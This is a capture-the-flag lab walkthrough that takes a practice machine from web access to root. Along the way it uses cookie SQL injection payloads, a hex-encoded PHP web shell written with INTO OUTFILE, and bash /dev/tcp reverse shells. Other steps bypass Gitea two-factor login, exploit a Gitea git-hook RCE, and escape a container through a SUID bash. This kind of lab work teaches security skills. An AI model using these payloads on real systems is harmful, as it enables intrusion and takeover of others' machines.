## ENUMERATION
Nmap scan: `nmap -p- -vv <MACHINE-IP> -oG initial-scan` 
```
PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 63
80/tcp open http syn-ack ttl 63
```
SSH on port 22 and webserver on port 80 as usual.

## WEB SERVER

![]()

I used gobuster for any hidden directories but got nothing.<br>
Using burp , we see there is a cookie being stored. We could some injection with the cookie.

![]()

This confirms that SQLi is the way to go. UNION SELECT works.
`Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,database() -- -` gives databse `webapp`

![]()

`Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='webapp' -- -` gives table `queue`

`Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema='webapp' and table_name='queue'-- -` gives 2 columns : `userID` and `queueNum`

Seems like we can even write to webroot using ` INTO OUTFILE '/var/www/html/`
`Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,'testing' INTO OUTFILE '/var/www/html/test.txt'-- -` gives:

![]

Using Command : `Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,LOAD_FILE('/etc/passwd') -- -` we got 1 user:
`dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash`
 
 As RCE detection is triggered by <? we'll have to hex encode our payload and then pass it through SQL unhex function.
 `Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,UNHEX('3C3F7068702073797374656D28244745545B27636D64275D293B203F3E') INTO OUTFILE '/var/www/html/cmd.php' -- -`
 Now if it works:

 ![]()

 It works!
 Now to move in , save this : `bash -i >& /dev/tcp/<IP Address>/<PORT> 0>&1` to a file and transfer it to the webserver using `<MACHINE-IP>/cmd.php?cmd=wget <YOUR-IP>:<PORT>/<file>`

 ![]()

 You should be in:

 ![]()

We are www-data. There is the user flag in dylan's home directory but we don't have the permission to read it. We can read the work_analysis file though.
In there we find Dylan's SSH password.

![]()
![]()

Using `ifconfig`, there seems to be a docker address. We don't seem to be in a container so probably that will come later.

![]()

Using LinPeas , we find `/app/gitea/gitea web` process running under dylan. Also that localhost is available on port 3000.
Let's use SSH port forwarding and check out that port
`ssh dylan@<MACHINE-IP> -L 3000:localhost:3000`

![]()

Signing in as dylan we get a 2 factor authentication.

![]()

Going back to dylan, checking `gitea` we find a db: `gitea.db` which is an SQLite3 database.

![]()

Let's delete the `two_factor table` from `gitea.db`:

![]()

And we're in. Now searching for any Gitea version 1.13.0 exploits , I found  [CVE-2020-14144](https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce) exploit.<br>
In the Test-repo, we go to `settings` > `Git Hooks` > `Post Recieve Hook`. In this hook , we can write a shell script that will get executed after getting a new commit.<br>

Add `bash -i >& /dev/tcp/<YOUR-IP>/<CHOSEN-PORT> 0>&1 ` to Post Recieve Hook and update it.<br>
Start a netcat listener, then on your local machine :
```
git clone http://localhost:3000/Dylan/Test-repo.git
cd Test-repo
echo "something" >> README.md
git add README.md
git commit -m 'RCE'
git push
```

![]()

## PRIVILEGE ESCALATION > ROOT
Now , we're in the container confirmed by the `.dockerenv` file in `/` and we gotta break out. We can `su` rightaway.
Check the `/data/` directory as the files are usually mount to host.<br>

This is the case here as well as the files in /data are identical to the /gitea directory in Dylan's shell.<BR>
Now just transfer the bash file located in /bin/ to /data/ and add the permissions.

![]()

Back at Dylan's: run `./bash -p` and you got root.

![]()






 
 
 
 



